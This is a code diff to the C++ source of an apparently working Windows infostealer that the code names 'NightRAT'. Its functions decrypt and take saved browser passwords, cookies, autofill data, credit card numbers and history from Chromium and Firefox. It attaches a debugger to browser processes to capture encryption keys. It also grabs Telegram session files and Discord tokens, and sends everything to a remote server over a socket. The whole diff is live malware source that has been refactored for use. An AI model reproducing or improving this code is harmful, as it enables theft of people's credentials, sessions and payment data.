@@ -76,7 +76,7 @@ static std::vector<WalletMetadata> target_wallets = {
     {"coinbasewallet", "hnfanknocfeofbddgcijnmhnfnkdnaad", "coinbase wallet"}
 };
 
-// --- Helpers ---
+// --- Utilities ---
 
 std::string to_narrow_string(const wchar_t* w_str) {
     if (!w_str) return "";
@@ -119,7 +119,7 @@ std::string json_escape(const std::string& s) {
 }
 
 std::string format_timestamp(double ts) {
-    if (ts <= 0) return "";
+    if (ts <= 0) return "N/A";
     time_t t = (time_t)ts; struct tm tm_buf;
 #ifdef _WIN32
     gmtime_s(&tm_buf, &t);
@@ -135,7 +135,7 @@ std::string to_lower(std::string s) {
     return s;
 }
 
-// --- Socket Communication ---
+// --- Communication ---
 
 static void send_with_mutex(SOCKET sock, const char* data, int len) {
     HANDLE hMutex = OpenMutexW(MUTEX_ALL_ACCESS, FALSE, L"Global\\NightRAT_Socket_Mutex");
@@ -151,7 +151,9 @@ static void send_with_mutex(SOCKET sock, const char* data, int len) {
 
 static void send_status(SOCKET sock, const std::string& msg) {
     if (sock == INVALID_SOCKET) return;
-    std::string json_msg = "{\"action\":\"recovery_status\",\"message\":\"" + msg + "\"}\r\n";
+    std::string clean_msg = msg;
+    std::replace(clean_msg.begin(), clean_msg.end(), '"', '\'');
+    std::string json_msg = "{\"action\":\"recovery_status\",\"message\":\"" + clean_msg + "\"}\r\n";
     send_with_mutex(sock, json_msg.c_str(), (int)json_msg.size());
 }
 
@@ -320,9 +322,17 @@ void extract_passwords(SOCKET sock, const fs::path& profile_path, const std::str
             std::vector<uint8_t> dec = decrypt_blob(std::vector<uint8_t>(b_ptr, b_ptr + b_size), v10_key, v20_key, is_opera);
             if (!dec.empty()) {
                 std::string s_url = url ? url : "", s_user = user ? user : "", s_pass = std::string(dec.begin(), dec.end());
-                txt << "URL: " << s_url << "\nUser: " << s_user << "\nPass: " << s_pass << "\n---\n";
+                txt << "==================================================\n"
+                    << "URL      : " << s_url << "\n"
+                    << "Username : " << s_user << "\n"
+                    << "Password : " << s_pass << "\n"
+                    << "==================================================\n\n";
                 if (!first) jsn << ",\n";
-                jsn << "    {\"url\": \"" << json_escape(s_url) << "\", \"username\": \"" << json_escape(s_user) << "\", \"password\": \"" << json_escape(s_pass) << "\"}";
+                jsn << "    {\n"
+                    << "        \"url\": \"" << json_escape(s_url) << "\",\n"
+                    << "        \"username\": \"" << json_escape(s_user) << "\",\n"
+                    << "        \"password\": \"" << json_escape(s_pass) << "\"\n"
+                    << "    }";
                 first = false;
             }
         }
@@ -337,15 +347,33 @@ void extract_cookies(SOCKET sock, const fs::path& profile_path, const std::strin
     if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
         std::ostringstream txt, jsn; jsn << "[\n"; bool first = true;
         while (sqlite3_step(stmt) == SQLITE_ROW) {
-            const char* host = (const char*)sqlite3_column_text(stmt, 0), *name = (const char*)sqlite3_column_text(stmt, 1), *val = (const char*)sqlite3_column_text(stmt, 2);
-            const uint8_t* b_ptr = (const uint8_t*)sqlite3_column_blob(stmt, 3); int b_size = sqlite3_column_bytes(stmt, 3); const char* path = (const char*)sqlite3_column_text(stmt, 4);
+            const char* host = (const char*)sqlite3_column_text(stmt, 0), *name = (const char*)sqlite3_column_text(stmt, 1), *val = (const char*)sqlite3_column_text(stmt, 2), *path = (const char*)sqlite3_column_text(stmt, 4);
+            const uint8_t* b_ptr = (const uint8_t*)sqlite3_column_blob(stmt, 3); int b_size = sqlite3_column_bytes(stmt, 3);
             long long exp_utc = sqlite3_column_int64(stmt, 5); int secure = sqlite3_column_int(stmt, 6), httponly = sqlite3_column_int(stmt, 7), samesite = sqlite3_column_int(stmt, 8);
             std::vector<uint8_t> dec = decrypt_blob(std::vector<uint8_t>(b_ptr, b_ptr + b_size), v10_key, v20_key, is_opera);
             std::string c_val = !dec.empty() ? std::string(dec.begin(), dec.end()) : (val ? val : "");
             if (!c_val.empty()) {
-                std::string s_name = name ? name : "", s_host = host ? host : "", s_path = path ? path : ""; double exp_date = (exp_utc > 0) ? ((double)(exp_utc - 11644473600000000ULL) / 1000000.0) : 0;
-                txt << s_name << "=" << c_val << ";\n"; if (!first) jsn << ",\n"; bool hostOnly = (s_host.size() > 0 && s_host[0] != '.');
-                jsn << "{\"Host raw\": \"" << (secure ? "https://" : "http://") << json_escape(s_host) << "/\", \"Name raw\": \"" << json_escape(s_name) << "\", \"Path raw\": \"" << json_escape(s_path) << "\", \"Content raw\": \"" << json_escape(c_val) << "\", \"Expires\": \"" << format_timestamp(exp_date) << "\", \"HTTP only raw\": \"" << (httponly ? "true" : "false") << "\", \"SameSite raw\": \"" << std::to_string(samesite) << "\", \"This domain only\": \"" << (hostOnly ? "true" : "false") << "\", \"Store raw\": \"" << to_lower(browser_name + "-" + profile_name) << "\"}";
+                std::string s_name = name ? name : "", s_host = host ? host : "", s_path = path ? path : "";
+                double exp_date = (exp_utc > 0) ? ((double)(exp_utc - 11644473600000000ULL) / 1000000.0) : 0;
+                txt << s_host << "\tTRUE\t" << s_path << "\t" << (secure ? "TRUE" : "FALSE") << "\t" << (long long)exp_date << "\t" << s_name << "\t" << c_val << "\n";
+                if (!first) jsn << ",\n";
+                bool hostOnly = (s_host.size() > 0 && s_host[0] != '.');
+                std::string exp_raw; { std::ostringstream ss_exp; ss_exp << std::fixed << std::setprecision(3) << exp_date; exp_raw = ss_exp.str(); }
+                jsn << "{\n"
+                    << "  \"Host raw\": \"" << (secure ? "https://" : "http://") << json_escape(s_host) << "/\",\n"
+                    << "  \"Name raw\": \"" << json_escape(s_name) << "\",\n"
+                    << "  \"Path raw\": \"" << json_escape(s_path) << "\",\n"
+                    << "  \"Content raw\": \"" << json_escape(c_val) << "\",\n"
+                    << "  \"Expires\": \"" << format_timestamp(exp_date) << "\",\n"
+                    << "  \"Expires raw\": \"" << exp_raw << "\",\n"
+                    << "  \"Send for\": \"" << (secure ? "Encrypted connections only" : "Any type of connection") << "\",\n"
+                    << "  \"Send for raw\": \"" << (secure ? "true" : "false") << "\",\n"
+                    << "  \"HTTP only raw\": \"" << (httponly ? "true" : "false") << "\",\n"
+                    << "  \"SameSite raw\": \"" << (samesite == 1 ? "lax" : (samesite == 2 ? "strict" : (samesite == 0 ? "no_restriction" : "unspecified"))) << "\",\n"
+                    << "  \"This domain only\": \"" << (hostOnly ? "Valid for host only" : "Valid for subdomains") << "\",\n"
+                    << "  \"This domain only raw\": \"" << (hostOnly ? "true" : "false") << "\",\n"
+                    << "  \"Store raw\": \"" << to_lower(browser_name + "-" + profile_name) << "\"\n"
+                    << "}";
                 first = false;
             }
         }
@@ -363,8 +391,15 @@ void extract_autofill(SOCKET sock, const fs::path& profile_path, const std::stri
             sqlite3_stmt* stmt; if (sqlite3_prepare_v2(db, "SELECT name, value FROM autofill", -1, &stmt, NULL) == SQLITE_OK) {
                 while (sqlite3_step(stmt) == SQLITE_ROW) {
                     const char* n = (const char*)sqlite3_column_text(stmt, 0), *v = (const char*)sqlite3_column_text(stmt, 1);
-                    std::string s_name = n?n:"", s_val = v?v:"";
-                    txt << "Form: " << s_name << " = " << s_val << "\n"; if (!first) jsn << ",\n"; jsn << "{\"type\": \"form\", \"name\": \"" << json_escape(s_name) << "\", \"value\": \"" << json_escape(s_val) << "\"}"; first = false;
+                    std::string s_name = n ? n : "", s_val = v ? v : "";
+                    txt << "Form     : " << s_name << " = " << s_val << "\n";
+                    if (!first) jsn << ",\n";
+                    jsn << "    {\n"
+                        << "        \"type\": \"form\",\n"
+                        << "        \"name\": \"" << json_escape(s_name) << "\",\n"
+                        << "        \"value\": \"" << json_escape(s_val) << "\"\n"
+                        << "    }";
+                    first = false;
                 }
                 sqlite3_finalize(stmt);
             }
@@ -375,7 +410,15 @@ void extract_autofill(SOCKET sock, const fs::path& profile_path, const std::stri
                     std::vector<uint8_t> dec = decrypt_blob(std::vector<uint8_t>(b_ptr, b_ptr + b_size), v10_key, v20_key, is_opera);
                     if (!dec.empty()) {
                         std::string s_name = name ? name : "", s_num = std::string(dec.begin(), dec.end());
-                        txt << "Card: " << s_name << " | Num: " << s_num << "\n"; if (!first) jsn << ",\n"; jsn << "{\"type\": \"card\", \"name\": \"" << json_escape(s_name) << "\", \"expiry\": \"" << std::to_string(m) << "/" << std::to_string(y) << "\", \"number\": \"" << json_escape(s_num) << "\"}"; first = false;
+                        txt << "Card     : " << s_name << " | Num: " << s_num << " | Exp: " << m << "/" << y << "\n";
+                        if (!first) jsn << ",\n";
+                        jsn << "    {\n"
+                            << "        \"type\": \"card\",\n"
+                            << "        \"name\": \"" << json_escape(s_name) << "\",\n"
+                            << "        \"expiry\": \"" << std::to_string(m) << "/" << std::to_string(y) << "\",\n"
+                            << "        \"number\": \"" << json_escape(s_num) << "\"\n"
+                            << "    }";
+                        first = false;
                     }
                 }
                 sqlite3_finalize(stmt);
@@ -394,7 +437,10 @@ void extract_history(SOCKET sock, const fs::path& profile_path, const std::strin
         while (sqlite3_step(stmt) == SQLITE_ROW) {
             const char* url = (const char*)sqlite3_column_text(stmt, 0), *title = (const char*)sqlite3_column_text(stmt, 1); int count = sqlite3_column_int(stmt, 2);
             std::string s_url = url ? url : "", s_title = title ? title : "";
-            txt << "URL: " << s_url << " | Title: " << s_title << "\n"; if (!first) jsn << ",\n"; jsn << "{\"url\": \"" << json_escape(s_url) << "\", \"title\": \"" << json_escape(s_title) << "\", \"visit_count\": " << count << "}"; first = false;
+            txt << "URL      : " << s_url << "\n" << "Title    : " << s_title << "\n" << "Visits   : " << count << "\n---\n";
+            if (!first) jsn << ",\n";
+            jsn << "    {\n" << "        \"url\": \"" << json_escape(s_url) << "\",\n" << "        \"title\": \"" << json_escape(s_title) << "\",\n" << "        \"visit_count\": " << count << "\n" << "    }";
+            first = false;
         }
         jsn << "\n]"; sqlite3_finalize(stmt); send_string_to_server(sock, out_prefix + "/history.txt", txt.str()); send_string_to_server(sock, out_prefix + "/history.json", jsn.str());
     }
@@ -419,7 +465,11 @@ void extract_all_profiles_data(SOCKET sock, const std::vector<uint8_t>& v20_key,
         if (fs::exists(p / "Preferences") || fs::exists(p / "Web Data") || fs::exists(p / "Login Data") || fs::exists(p / "Cookies") || fs::exists(p / "Network" / "Cookies")) {
             std::string p_name = p.filename().string(); if (p_name == "User Data" || p_name == "EBWebView") p_name = "RootProfile";
             std::string out = config.output_dir + "/" + p_name;
-            extract_passwords(sock, p, out, v10_key, v20_key, is_opera); extract_cookies(sock, p, out, v10_key, v20_key, is_opera, config.name, p_name); extract_autofill(sock, p, out, v10_key, v20_key, is_opera); extract_history(sock, p, out); extract_chromium_wallets(sock, p, config.name, p_name);
+            try { extract_passwords(sock, p, out, v10_key, v20_key, is_opera); } catch(...) {}
+            try { extract_cookies(sock, p, out, v10_key, v20_key, is_opera, config.name, p_name); } catch(...) {}
+            try { extract_autofill(sock, p, out, v10_key, v20_key, is_opera); } catch(...) {}
+            try { extract_history(sock, p, out); } catch(...) {}
+            try { extract_chromium_wallets(sock, p, config.name, p_name); } catch(...) {}
         }
     };
     process(user_data); std::error_code ec; for (const auto& entry : fs::directory_iterator(user_data, ec)) if (!ec && entry.is_directory()) process(entry.path());
@@ -433,10 +483,30 @@ void extract_firefox_cookies(SOCKET sock, const fs::path& profile_path, const st
     if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
         std::ostringstream txt, jsn; jsn << "[\n"; bool first = true;
         while (sqlite3_step(stmt) == SQLITE_ROW) {
-            const char* host = (const char*)sqlite3_column_text(stmt, 0), *name = (const char*)sqlite3_column_text(stmt, 1), *val = (const char*)sqlite3_column_text(stmt, 2);
-            long long exp = sqlite3_column_int64(stmt, 4); int secure = sqlite3_column_int(stmt, 5);
-            std::string s_host = host ? host : "", s_name = name ? name : "", s_val = val ? val : "";
-            txt << s_name << "=" << s_val << ";\n"; if (!first) jsn << ",\n"; jsn << "{\"Host raw\": \"" << (secure ? "https://" : "http://") << json_escape(s_host) << "/\", \"Name raw\": \"" << json_escape(s_name) << "\", \"Content raw\": \"" << json_escape(s_val) << "\", \"Expires\": \"" << format_timestamp((double)exp) << "\", \"Store raw\": \"" << to_lower(browser_name + "-" + profile_name) << "\"}"; first = false;
+            const char* host = (const char*)sqlite3_column_text(stmt, 0), *name = (const char*)sqlite3_column_text(stmt, 1), *val = (const char*)sqlite3_column_text(stmt, 2), *path = (const char*)sqlite3_column_text(stmt, 3);
+            long long exp = sqlite3_column_int64(stmt, 4); int secure = sqlite3_column_int(stmt, 5), httponly = sqlite3_column_int(stmt, 6), samesite = sqlite3_column_int(stmt, 7);
+            std::string s_host = host ? host : "", s_name = name ? name : "", s_val = val ? val : "", s_path = path ? path : "";
+            double exp_date = (double)exp;
+            txt << s_host << "\tTRUE\t" << s_path << "\t" << (secure ? "TRUE" : "FALSE") << "\t" << (long long)exp_date << "\t" << s_name << "\t" << s_val << "\n";
+            if (!first) jsn << ",\n";
+            bool hostOnly = (s_host.size() > 0 && s_host[0] != '.');
+            std::string exp_raw; { std::ostringstream ss_exp; ss_exp << std::fixed << std::setprecision(3) << exp_date; exp_raw = ss_exp.str(); }
+            jsn << "{\n"
+                    << "  \"Host raw\": \"" << (secure ? "https://" : "http://") << json_escape(s_host) << "/\",\n"
+                    << "  \"Name raw\": \"" << json_escape(s_name) << "\",\n"
+                    << "  \"Path raw\": \"" << json_escape(s_path) << "\",\n"
+                    << "  \"Content raw\": \"" << json_escape(s_val) << "\",\n"
+                    << "  \"Expires\": \"" << format_timestamp(exp_date) << "\",\n"
+                    << "  \"Expires raw\": \"" << exp_raw << "\",\n"
+                    << "  \"Send for\": \"" << (secure ? "Encrypted connections only" : "Any type of connection") << "\",\n"
+                    << "  \"Send for raw\": \"" << (secure ? "true" : "false") << "\",\n"
+                    << "  \"HTTP only raw\": \"" << (httponly ? "true" : "false") << "\",\n"
+                    << "  \"SameSite raw\": \"" << (samesite == 1 ? "lax" : (samesite == 2 ? "strict" : (samesite == 0 ? "no_restriction" : "unspecified"))) << "\",\n"
+                    << "  \"This domain only\": \"" << (hostOnly ? "Valid for host only" : "Valid for subdomains") << "\",\n"
+                    << "  \"This domain only raw\": \"" << (hostOnly ? "true" : "false") << "\",\n"
+                    << "  \"Store raw\": \"" << to_lower(browser_name + "-" + profile_name) << "\"\n"
+                    << "}";
+            first = false;
         }
         jsn << "\n]"; sqlite3_finalize(stmt); send_string_to_server(sock, out_prefix + "/cookies.txt", txt.str()); send_string_to_server(sock, out_prefix + "/cookies.json", jsn.str());
     }
@@ -451,7 +521,10 @@ void extract_firefox_history(SOCKET sock, const fs::path& profile_path, const st
         while (sqlite3_step(stmt) == SQLITE_ROW) {
             const char* url = (const char*)sqlite3_column_text(stmt, 0), *title = (const char*)sqlite3_column_text(stmt, 1); int count = sqlite3_column_int(stmt, 2);
             std::string s_url = url ? url : "", s_title = title ? title : "";
-            txt << "URL: " << s_url << " | Title: " << s_title << "\n"; if (!first) jsn << ",\n"; jsn << "{\"url\": \"" << json_escape(s_url) << "\", \"title\": \"" << json_escape(s_title) << "\", \"visit_count\": " << count << "}"; first = false;
+            txt << "URL      : " << s_url << "\n" << "Title    : " << s_title << "\n" << "Visits   : " << count << "\n---\n";
+            if (!first) jsn << ",\n";
+            jsn << "    {\n" << "        \"url\": \"" << json_escape(s_url) << "\",\n" << "        \"title\": \"" << json_escape(s_title) << "\",\n" << "        \"visit_count\": " << count << "\n" << "    }";
+            first = false;
         }
         jsn << "\n]"; sqlite3_finalize(stmt); send_string_to_server(sock, out_prefix + "/history.txt", txt.str()); send_string_to_server(sock, out_prefix + "/history.json", jsn.str());
     }
@@ -466,7 +539,10 @@ void extract_firefox_autofill(SOCKET sock, const fs::path& profile_path, const s
         while (sqlite3_step(stmt) == SQLITE_ROW) {
             const char* name = (const char*)sqlite3_column_text(stmt, 0), *val = (const char*)sqlite3_column_text(stmt, 1);
             std::string s_name = name ? name : "", s_val = val ? val : "";
-            txt << "Field: " << s_name << " = " << s_val << "\n"; if (!first) jsn << ",\n"; jsn << "{\"name\": \"" << json_escape(s_name) << "\", \"value\": \"" << json_escape(s_val) << "\"}"; first = false;
+            txt << "Field    : " << s_name << " = " << s_val << "\n";
+            if (!first) jsn << ",\n";
+            jsn << "    {\n" << "        \"name\": \"" << json_escape(s_name) << "\",\n" << "        \"value\": \"" << json_escape(s_val) << "\"\n" << "    }";
+            first = false;
         }
         jsn << "\n]"; sqlite3_finalize(stmt); send_string_to_server(sock, out_prefix + "/autofill.txt", txt.str()); send_string_to_server(sock, out_prefix + "/autofill.json", jsn.str());
     }
@@ -510,9 +586,9 @@ void extract_firefox_passwords(SOCKET sock, const fs::path& profile_path, const 
                         SECItem d_u = { 0, NULL, 0 }, d_p = { 0, NULL, 0 };
                         if (nss.PK11SDR_Decrypt(&u_item, &d_u, NULL) == SECSuccess && nss.PK11SDR_Decrypt(&p_item, &d_p, NULL) == SECSuccess) {
                             std::string s_u((char*)d_u.data, d_u.len), s_p((char*)d_p.data, d_p.len);
-                            txt << "URL: " << host << "\nUser: " << s_u << "\nPass: " << s_p << "\n---\n";
+                            txt << "==================================================\n" << "URL      : " << host << "\n" << "Username : " << s_u << "\n" << "Password : " << s_p << "\n" << "==================================================\n\n";
                             if (!first) jsn << ",\n";
-                            jsn << "{\"url\": \"" << json_escape(host) << "\", \"username\": \"" << json_escape(s_u) << "\", \"password\": \"" << json_escape(s_p) << "\"}";
+                            jsn << "    {\n" << "        \"url\": \"" << json_escape(host) << "\",\n" << "        \"username\": \"" << json_escape(s_u) << "\",\n" << "        \"password\": \"" << json_escape(s_p) << "\"\n" << "    }";
                             first = false;
                         }
                         pos = end;
@@ -534,63 +610,15 @@ void extract_firefox_data(SOCKET sock, const BrowserConfig& config, const std::w
     for (const auto& entry : fs::directory_iterator(ud, ec)) if (!ec && entry.is_directory()) {
         fs::path p = entry.path(); if (fs::exists(p / "cookies.sqlite") || fs::exists(p / "logins.json")) {
             std::string p_name = p.filename().string(), out = config.output_dir + "/" + p_name;
-            extract_firefox_cookies(sock, p, out, config.name, p_name); extract_firefox_history(sock, p, out); extract_firefox_autofill(sock, p, out);
-            if (!nss_dir.empty()) extract_firefox_passwords(sock, p, out, nss_dir);
+            try { extract_firefox_cookies(sock, p, out, config.name, p_name); } catch(...) {}
+            try { extract_firefox_history(sock, p, out); } catch(...) {}
+            try { extract_firefox_autofill(sock, p, out); } catch(...) {}
+            if (!nss_dir.empty()) { try { extract_firefox_passwords(sock, p, out, nss_dir); } catch(...) {} }
         }
     }
 }
 
-// --- Path & Root Discovery (Redefined for correct scope) ---
-
-std::vector<uint32_t> get_all_threads(uint32_t process_id);
-void set_hardware_breakpoint(uint32_t tid, size_t addr);
-void clear_hardware_breakpoints(uint32_t pid);
-void set_resume_flag(uint32_t tid);
-InterceptPoint find_target_address(HANDLE h_proc, void* base, const std::string& name);
-std::vector<uint8_t> debug_loop_get_key(SOCKET sock, uint32_t pid, const BrowserConfig& config);
-
-// --- Browser Logic (Continued) ---
-
-void extract_telegram_session(SOCKET sock) {
-    wchar_t* ad; if (SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &ad) != S_OK) return;
-    fs::path t = fs::path(ad) / L"Telegram Desktop" / L"tdata"; CoTaskMemFree(ad); if (!fs::exists(t)) return;
-    send_status(sock, "Extracting Telegram...");
-    for (const auto& f : {"key_datas", "map0", "map1", "settingss"}) if (fs::exists(t / f)) send_file_from_disk(sock, t / f, "telegram session/tdata/" + std::string(f));
-    std::error_code ec; for (const auto& entry : fs::directory_iterator(t, ec)) if (!ec && entry.is_directory()) {
-        std::string fn = entry.path().filename().string();
-        if (fn.length() == 16 && std::all_of(fn.begin(), fn.end(), [](unsigned char c){ return std::isxdigit(c); })) {
-            for (const auto& sub : fs::recursive_directory_iterator(entry.path(), ec)) if (!ec && !sub.is_directory()) {
-                std::string sn = sub.path().filename().string(); if (sn.find(".log") == std::string::npos && sn.find("dumps") == std::string::npos) send_file_from_disk(sock, sub.path(), "telegram session/tdata/" + fn + "/" + fs::relative(sub.path(), entry.path()).string());
-            }
-        }
-    }
-}
-
-void extract_discord_tokens(SOCKET sock, const std::wstring& discord_path_w, const std::string& output_name) {
-    fs::path dp(discord_path_w); if (!fs::exists(dp)) return;
-    std::vector<uint8_t> mk; bool dpapi; if (!get_v10_key(discord_path_w, mk, dpapi)) return;
-    fs::path ldb = dp / "Local Storage" / "leveldb"; if (!fs::exists(ldb)) return;
-    std::set<std::string> tokens; std::regex enc_r("dQw4w9WgXcQ:([^\"\\s\\x00-\\x1F]+)"), plain_r("[a-zA-Z0-9_-]{24,28}\\.[a-zA-Z0-9_-]{6}\\.[a-zA-Z0-9_-]{25,110}");
-    std::error_code ec; for (const auto& entry : fs::directory_iterator(ldb, ec)) {
-        if (!ec && (entry.path().extension() == ".log" || entry.path().extension() == ".ldb")) {
-            std::ifstream ifs(entry.path(), std::ios::binary); if (ifs) {
-                std::string content((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
-                for (auto i = std::sregex_iterator(content.begin(), content.end(), enc_r); i != std::sregex_iterator(); ++i) {
-                    std::string enc = (*i)[1].str(); if (!enc.empty() && enc.back() == '\\') enc.pop_back();
-                    std::vector<uint8_t> eb = base64_decode(enc); if (!eb.empty()) { std::vector<uint8_t> dec = decrypt_blob(eb, mk, {}, false); if (!dec.empty()) tokens.insert(std::string(dec.begin(), dec.end())); }
-                }
-                for (auto i = std::sregex_iterator(content.begin(), content.end(), plain_r); i != std::sregex_iterator(); ++i) tokens.insert((*i).str());
-            }
-        }
-    }
-    if (!tokens.empty()) {
-        std::ostringstream txt, jsn; jsn << "[\n"; bool first = true;
-        for (const auto& t : tokens) { txt << t << "\n"; if (!first) jsn << ",\n"; jsn << "  \"" << json_escape(t) << "\""; first = false; }
-        jsn << "\n]"; send_string_to_server(sock, "discord/" + output_name + "/tokens.txt", txt.str()); send_string_to_server(sock, "discord/" + output_name + "/tokens.json", jsn.str());
-    }
-}
-
-// --- Debugger Loop Implementations ---
+// --- Debugger Support ---
 
 std::vector<uint32_t> get_all_threads(uint32_t process_id) {
     std::vector<uint32_t> threads; HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
@@ -646,23 +674,28 @@ InterceptPoint find_target_address(HANDLE h_proc, void* base, const std::string&
 
 std::vector<uint8_t> debug_loop_get_key(SOCKET sock, uint32_t pid, const BrowserConfig& config) {
     DEBUG_EVENT de = {0}; size_t t_rva = 0; std::vector<uint8_t> key; DWORD start = GetTickCount(); std::map<uint32_t, HANDLE> procs; std::map<uint32_t, size_t> bases; std::set<size_t> patched; int p_reg = -1;
+    bool found_pattern = false;
     while (GetTickCount() - start < 30000) {
-        if (!WaitForDebugEvent(&de, 100)) continue;
-        if (de.dwDebugEventCode == CREATE_PROCESS_DEBUG_EVENT) procs[de.dwProcessId] = de.u.CreateProcessInfo.hProcess;
-        else if (de.dwDebugEventCode == EXIT_PROCESS_DEBUG_EVENT) { procs.erase(de.dwProcessId); if (de.dwProcessId == pid) { ContinueDebugEvent(de.dwProcessId, de.dwThreadId, DBG_CONTINUE); return key; } }
-        else if (de.dwDebugEventCode == LOAD_DLL_DEBUG_EVENT) {
+        if (!WaitForDebugEvent(&de, 100)) { if (GetTickCount() - start >= 30000) break; continue; }
+        switch (de.dwDebugEventCode) {
+        case CREATE_PROCESS_DEBUG_EVENT: procs[de.dwProcessId] = de.u.CreateProcessInfo.hProcess; break;
+        case EXIT_PROCESS_DEBUG_EVENT: procs.erase(de.dwProcessId); if (de.dwProcessId == pid) { ContinueDebugEvent(de.dwProcessId, de.dwThreadId, DBG_CONTINUE); return key; } break;
+        case LOAD_DLL_DEBUG_EVENT: {
             wchar_t buf[MAX_PATH]; if (GetFinalPathNameByHandleW(de.u.LoadDll.hFile, buf, MAX_PATH, 0)) {
                 std::wstring path = buf, name = utf8_to_wstring(config.dll_name);
                 if (path.find(name) != std::wstring::npos) {
                     bases[de.dwProcessId] = (size_t)de.u.LoadDll.lpBaseOfDll;
-                    if (!t_rva) { InterceptPoint ip = find_target_address(procs[de.dwProcessId], de.u.LoadDll.lpBaseOfDll, config.name); if (ip.address) { t_rva = ip.address - (size_t)de.u.LoadDll.lpBaseOfDll; p_reg = ip.reg_index; send_status(sock, "Pattern found in " + config.dll_name); } }
+                    if (!t_rva) { InterceptPoint ip = find_target_address(procs[de.dwProcessId], de.u.LoadDll.lpBaseOfDll, config.name); if (ip.address) { t_rva = ip.address - (size_t)de.u.LoadDll.lpBaseOfDll; p_reg = ip.reg_index; found_pattern = true; send_status(sock, "Pattern localized in " + config.dll_name); } }
                     if (t_rva) {
                         size_t addr = (size_t)de.u.LoadDll.lpBaseOfDll + t_rva; for (uint32_t tid : get_all_threads(de.dwProcessId)) set_hardware_breakpoint(tid, addr);
                         uint8_t int3 = 0xCC; SIZE_T w; if (WriteProcessMemory(procs[de.dwProcessId], (LPVOID)addr, &int3, 1, &w)) patched.insert(addr);
                     }
                 }
             }
-        } else if (de.dwDebugEventCode == EXCEPTION_DEBUG_EVENT) {
+            if (de.u.LoadDll.hFile != INVALID_HANDLE_VALUE) CloseHandle(de.u.LoadDll.hFile);
+            break;
+        }
+        case EXCEPTION_DEBUG_EVENT: {
             uint32_t code = de.u.Exception.ExceptionRecord.ExceptionCode; size_t addr = (size_t)de.u.Exception.ExceptionRecord.ExceptionAddress;
             if (code == EXCEPTION_SINGLE_STEP || code == EXCEPTION_BREAKPOINT) {
                 size_t cur = t_rva && bases.count(de.dwProcessId) ? bases[de.dwProcessId] + t_rva : 0;
@@ -689,17 +722,61 @@ std::vector<uint8_t> debug_loop_get_key(SOCKET sock, uint32_t pid, const Browser
                 }
                 if (code == EXCEPTION_SINGLE_STEP) set_resume_flag(de.dwThreadId);
             }
+            break;
+        }
         }
         ContinueDebugEvent(de.dwProcessId, de.dwThreadId, DBG_CONTINUE);
     }
+    if (!found_pattern) send_status(sock, "Interception pattern not found for " + config.name);
     return key;
+}
+
+// --- Additional Extraction ---
+
+void extract_telegram_session(SOCKET sock) {
+    wchar_t* ad; if (SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &ad) != S_OK) return;
+    fs::path t = fs::path(ad) / L"Telegram Desktop" / L"tdata"; CoTaskMemFree(ad); if (!fs::exists(t)) return;
+    send_status(sock, "Extracting Telegram...");
+    for (const auto& f : {"key_datas", "map0", "map1", "settingss"}) if (fs::exists(t / f)) send_file_from_disk(sock, t / f, "telegram session/tdata/" + std::string(f));
+    std::error_code ec; for (const auto& entry : fs::directory_iterator(t, ec)) if (!ec && entry.is_directory()) {
+        std::string fn = entry.path().filename().string();
+        if (fn.length() == 16 && std::all_of(fn.begin(), fn.end(), [](unsigned char c){ return std::isxdigit(c); })) {
+            for (const auto& sub : fs::recursive_directory_iterator(entry.path(), ec)) if (!ec && !sub.is_directory()) {
+                std::string sn = sub.path().filename().string(); if (sn.find(".log") == std::string::npos && sn.find("dumps") == std::string::npos) send_file_from_disk(sock, sub.path(), "telegram session/tdata/" + fn + "/" + fs::relative(sub.path(), entry.path()).string());
+            }
+        }
+    }
+}
+
+void extract_discord_tokens(SOCKET sock, const std::wstring& discord_path_w, const std::string& output_name) {
+    fs::path dp(discord_path_w); if (!fs::exists(dp)) return;
+    std::vector<uint8_t> mk; bool dpapi; if (!get_v10_key(discord_path_w, mk, dpapi)) return;
+    fs::path ldb = dp / "Local Storage" / "leveldb"; if (!fs::exists(ldb)) return;
+    std::set<std::string> tokens; std::regex enc_r("dQw4w9WgXcQ:([^\"\\s\\x00-\\x1F]+)"), plain_r("[a-zA-Z0-9_-]{24,28}\\.[a-zA-Z0-9_-]{6}\\.[a-zA-Z0-9_-]{25,110}");
+    std::error_code ec; for (const auto& entry : fs::directory_iterator(ldb, ec)) {
+        if (!ec && (entry.path().extension() == ".log" || entry.path().extension() == ".ldb")) {
+            std::ifstream ifs(entry.path(), std::ios::binary); if (ifs) {
+                std::string content((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
+                for (auto i = std::sregex_iterator(content.begin(), content.end(), enc_r); i != std::sregex_iterator(); ++i) {
+                    std::string enc = (*i)[1].str(); if (!enc.empty() && enc.back() == '\\') enc.pop_back();
+                    std::vector<uint8_t> eb = base64_decode(enc); if (!eb.empty()) { std::vector<uint8_t> dec = decrypt_blob(eb, mk, {}, false); if (!dec.empty()) tokens.insert(std::string(dec.begin(), dec.end())); }
+                }
+                for (auto i = std::sregex_iterator(content.begin(), content.end(), plain_r); i != std::sregex_iterator(); ++i) tokens.insert((*i).str());
+            }
+        }
+    }
+    if (!tokens.empty()) {
+        std::ostringstream txt, jsn; jsn << "[\n"; bool first = true;
+        for (const auto& t : tokens) { txt << t << "\n"; if (!first) jsn << ",\n"; jsn << "  \"" << json_escape(t) << "\""; first = false; }
+        jsn << "\n]"; send_string_to_server(sock, "discord/" + output_name + "/tokens.txt", txt.str()); send_string_to_server(sock, "discord/" + output_name + "/tokens.json", jsn.str());
+    }
 }
 
 // --- Main Runner ---
 
 void run_recovery(SOCKET sock) {
     if (sock != INVALID_SOCKET) { std::string msg = "{\"action\":\"recovery_start\"}\r\n"; send_with_mutex(sock, msg.c_str(), (int)msg.size()); }
-    send_status(sock, "Starting recovery...");
+    send_status(sock, "Starting professional recovery loop...");
     std::vector<BrowserConfig> configs = {
         {"Google Chrome", "chrome.exe", {L"chrome.exe"}, "chrome.dll", {L"Google", L"Chrome", L"User Data"}, "browsers/Google Chrome", "chrome_tmp", false, false, true, false},
